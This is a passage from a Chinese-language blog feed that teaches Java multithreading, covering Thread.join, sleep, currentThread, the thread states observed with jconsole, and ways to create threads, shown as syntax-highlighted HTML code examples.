class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;线程工作中!&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 让主线程来等待 t 线程执行结束.</span></span><br><span class="line">        <span class="comment">// 一旦调用 join, 主线程就会触发阻塞. 此时 t 线程就可以趁机完成后续的工作.</span></span><br><span class="line">        <span class="comment">// 一直阻塞到 t 执行完毕了, join 才会解除阻塞, 才能继续执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;join 等待开始&quot;</span>);</span><br><span class="line">        thread.join();</span><br><span class="line">        System.out.println(<span class="string">&quot;join 等待结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="thread-join工作过程"><a href="#thread-join工作过程" class="headerlink" title="thread.join工作过程"></a><strong>thread.join工作过程</strong></h5><p>1.如果线程正在工作中，此时调用thread线程就会阻塞，一直阻塞到thread线程执行结束位置.<br>2.如果thread线程已经执行结束了，此时调用join线程，就会直接返回，不会涉及阻塞.<br>【实际开发中比较建议使用join时带有超时时间】</p><p><strong>Tips：</strong><br>sleep本身也有精度误差，调度线程也有开销.（即唤醒线程之后【就绪状态】不是立即回到CPU上运行）</p><p><strong>附：</strong></p><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">public void join(）</td><td align="center">等待线程结束</td></tr><tr><td align="center">public void join(long millis）</td><td align="center">等待线程结束，最多等millis毫秒</td></tr><tr><td align="center">public void join(long millis，int nanos）</td><td align="center">精度更高但同理</td></tr></tbody></table><h4 id="获取线程引用"><a href="#获取线程引用" class="headerlink" title="获取线程引用"></a>获取线程引用</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>public static Thread currentThread()；</td><td>返回当前线程对象的引用</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        System.out.println(thread.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="休眠进程"><a href="#休眠进程" class="headerlink" title="休眠进程"></a>休眠进程</h4><p>眼熟吗老师们hh<br><strong>注意：因为线程是不可控制的，所以这个方法只能保证实际休眠时间大于等于参数设置的休眠时间</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>public static void sleep(long millis) throws InterruptedException</td><td>休眠当前线程 millis毫秒</td></tr><tr><td>public static void sleep(long millis, int nanos) throws InterruptedException</td><td>更高精度的休眠</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h3><p>帮助我们快速判断当前程序执行的状况.<br>线程的状态是一个枚举类型Thread.State.</p><h4 id="NEW"><a href="#NEW" class="headerlink" title="NEW"></a>NEW</h4><p>安排了工作但还在摸鱼未动<br>Thread对象已经有了但start方法还没调用.</p><h4 id="TERMINATED"><a href="#TERMINATED" class="headerlink" title="TERMINATED"></a>TERMINATED</h4><p>工作已完成<br>Thread对象还在，内核中线程已经结束了.</p><h4 id="RUNNABLE"><a href="#RUNNABLE" class="headerlink" title="RUNNABLE"></a>RUNNABLE</h4><p>可工作，可以分成正在工作中和即将开始的工作<br>就绪状态（线程已经在CPU上执行了&#x2F;线程正在等待CPU执行）</p><h4 id="TIMED-WAITING"><a href="#TIMED-WAITING" class="headerlink" title="TIMED_WAITING"></a>TIMED_WAITING</h4><p>排队等安排工作<br>阻塞.sleep这种固定时间的方法产生的阻塞.</p><h4 id="WAITING"><a href="#WAITING" class="headerlink" title="WAITING"></a>WAITING</h4><p>排队等安排工作<br>由于wait这种不固定时间的方式产生的阻塞.</p><h4 id="BLOCKED"><a href="#BLOCKED" class="headerlink" title="BLOCKED"></a>BLOCKED</h4><p>排队等安排工作<br>阻塞.锁竞争产生.<br><strong>与阻塞相关的三种状态后续常用于分析“线程卡死”问题</strong></p><h5 id="代码套餐"><a href="#代码套餐" class="headerlink" title="代码套餐"></a>代码套餐</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;Thread&quot;</span>);</span><br><span class="line">        <span class="comment">//线程未调用start方法对象已创建 此时状态为New</span></span><br><span class="line">        System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="keyword">while</span> (t.isAlive()) &#123;</span><br><span class="line">            <span class="comment">//RUNNABLE 线程正在执行</span></span><br><span class="line">            System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//线程执行结束TERMINATED</span></span><br><span class="line">        System.out.println(t.getName() + <span class="string">&quot;: &quot;</span> + t.getState());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;hehe&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204151561.png" alt="image-20240816204151561"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204208543.png" alt="image-20240816204208543"></p><p>使用jconsole观察，t1线程为TIMED_WAITING状态（排队等工作 sleep引起），t2线程为BLOCKED状态（由于t1未执行完 产生锁竞争）</p><p>修改sleep为wait后 t2线程结束 打印出“hehe” t1线程为WAITING状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadStateTransfer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            object.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;hehe&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816204737122.png" alt="image-20240816204737122"></p><h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><p>1.BLOCKED 表示等待获取锁, WAITING 和TIMED_WAITING 表示等待其他线程发来通知.  2.TIMED_WAITING 线程在等待唤醒，但设置了时限; WAITING 线程在无限等待唤醒</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x1_</title>
      <link href="/2024/09/04/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%80/"/>
      <url>/2024/09/04/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="多线程篇一"><a href="#多线程篇一" class="headerlink" title="多线程篇一"></a>多线程篇一</h2><p><strong>如笔者理解有误，欢迎交流指正⭐</strong></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>一个线程就是一个“执行流”.<br>每一个线程都是一个独立的执行逻辑.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个类, 继承自 Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这个方法就是线程的入口方法.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  交替打印</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//全部打印Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> start 和 run 都是 Thread 的成员.<br> <strong>run 只是描述了线程的入口(线程要做什么任务)</strong><br> **start 则是真正调用了系统 API, 在系统中创建出线程, 让线程再调用 run.**（即实现并发【兵分两路 充分利用多核CPU】 Java中的“并发”多指并行+并发 区别操作系统中的宏观和微观理解）</p><h5 id="为什么需要线程"><a href="#为什么需要线程" class="headerlink" title="为什么需要线程"></a>为什么需要线程</h5><p>好奇宝宝发问🤭<br>人多力量大！单核CPU能力有限，多核CPU可以提高算力，<strong>并发</strong>编程能充分利用多核CPU的资源.<br>我们是有礼貌的孩子！“IO等待”在有些场景无法避免，如何利用等待的时间做其他工作？当然少不了并发编程.<br><strong>tips</strong><br>多进程也能实现并发，但线程量级更轻.<br>1.创建线程比创建进程更快.<br>2.销毁线程比销毁进程更快.<br>3.调度线程比调度进程更快.</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>当进行复杂任务时，会创建多个线程进行问题处理，不同线程有不同的小任务排队执行.<br><strong>操作系统中运行的任何程序都至少有一个主线程.</strong></p><h4 id="如何监测多线程运行情况"><a href="#如何监测多线程运行情况" class="headerlink" title="如何监测多线程运行情况"></a>如何监测多线程运行情况</h4><h5 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h5><p>debug启动有一个专门的窗口查看方法的调用栈，可以查看所有线程的信息.</p><p>下断点，右击可选择全部线程（ALL）或者指定的线程（Thread）</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812112804515.png" alt="image-20240812112804515"></p><p>debug<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812113418013.png" alt="image-20240812113418013"></p><h5 id="Jconsole"><a href="#Jconsole" class="headerlink" title="Jconsole"></a>Jconsole</h5><p><strong>新手推荐</strong></p><p>启动前确保程序跑起来<br>Jconsole是JDK中自带的工具<br>Ctrl+Alt+shift+s打开project structure 查看jdk路径<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812113858448.png" alt="image-20240812113858448"></p><p>如果双击打不开 可尝试管理员方式运行<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812114349198.png" alt="image-20240812114349198"></p><h4 id="线程和进程的区别"><a href="#线程和进程的区别" class="headerlink" title="线程和进程的区别"></a>线程和进程的区别</h4><p>1.进程是包含线程的:每个进程至少有一个线程存在，即主线程.<br>2.进程和进程之间不共享内存空间. 同一个进程的线程之间共享同一个内存空间.<br>3.进程是系统分配资源的最小单位，线程是系统调度的最小单位.</p><h4 id="Thread-sleep"><a href="#Thread-sleep" class="headerlink" title="Thread.sleep()"></a>Thread.sleep()</h4><p>线程休眠，方便观察，sleep是Thread的静态方法.<br>sleep方法可能会抛出如下异常<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812115012903.png" alt="image-20240812115012903"></p><p>此异常为受查异常，必须显示处理<br><strong>必须try cacth<em>，不能throws</em></strong><br><u>上述代码重写父类的run，父类的run方法没有throws，子类也不能有</u>（开头线程处代码 可查源码）<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240812115452951.png" alt="image-20240812115452951"></p><p>sleep每秒钟打印出来的顺序也是不确定的“随机性”.<br>取决于操作系统对线程的调度模块，非等概率随机.</p><h3 id="创建线程的其他写法【面试题】"><a href="#创建线程的其他写法【面试题】" class="headerlink" title="创建线程的其他写法【面试题】"></a>创建线程的其他写法【面试题】</h3><p>非完全，后续进行补充~</p><h4 id="继承thread-重写run（显示）"><a href="#继承thread-重写run（显示）" class="headerlink" title="继承thread 重写run（显示）"></a>继承thread 重写run（显示）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个类, 继承自 Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这个方法就是线程的入口方法.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  交替打印</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//全部打印Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实现Runnable-重写run（显示）"><a href="#实现Runnable-重写run（显示）" class="headerlink" title="实现Runnable 重写run（显示）"></a>实现Runnable 重写run（显示）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyRunnable</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(runnable);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比上面两种方法: <strong>继承 Thread 类, 直接使用 this 就表示当前线程对象的引用.  实现 Runnable 接口, this 表示的是 MyRunnable 的引用. 需要使用 Thread.currentThread()</strong></p><h4 id="继承Thread-重写run-使用匿名内部类"><a href="#继承Thread-重写run-使用匿名内部类" class="headerlink" title="继承Thread 重写run 使用匿名内部类"></a>继承Thread 重写run 使用匿名内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> 